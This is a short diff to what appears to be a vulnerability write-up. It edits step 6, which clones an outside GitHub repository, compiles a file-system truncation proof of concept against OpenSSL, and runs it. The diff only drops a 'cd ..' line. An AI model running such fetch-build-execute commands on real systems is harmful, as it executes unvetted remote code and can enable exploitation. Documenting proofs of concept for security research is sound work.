@@ -155,7 +155,6 @@ Output:
 ### Step 6: Compile and run the PoC
 
 ```bash
-cd ..
 git clone https://github.com/H1bbpskills/forp1vulns.git
 g++ -std=c++17 -w -o poc_test forp1vulns/poc/fs_truncation_poc.cpp -lssl -lcrypto
 ./poc_test
